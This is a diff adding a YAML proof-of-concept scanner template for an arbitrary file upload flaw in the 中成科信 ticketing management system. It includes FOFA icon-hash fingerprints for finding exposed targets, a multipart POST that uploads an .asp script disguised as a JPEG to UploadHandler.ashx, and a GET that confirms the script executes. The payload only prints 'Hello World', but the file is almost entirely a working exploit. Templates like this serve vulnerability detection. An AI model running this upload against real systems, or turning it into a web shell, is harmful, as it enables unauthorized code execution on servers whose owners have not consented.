@@ -1,0 +1,32 @@
+id: poc-yaml-zckx-ticketmanager-uploadhandler-upload
+info:
+  name: 中成科信票务管理系统 UploadHandler.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 中城科信票务管理平台
+  fofa: icon_hash="1632964065" || icon_hash="-2142050529"
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /WeChat/ashx/UploadHandler.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+  data: '------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
+
+    Content-Disposition: form-data; name="file"; filename="{{.filename}}.asp"
+
+    Content-Type: image/jpeg
+
+
+    <% Response.Write("Hello World") %>
+
+    ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
+
+    '
+  expression: "status_code == 200 && \nbody == \"1\"\n"
+- method: GET
+  path: /UploadImage/{{.filename}}.asp
+  expression: "status_code == 200 && \nbody == \"Hello World\"\n"
+transport: http
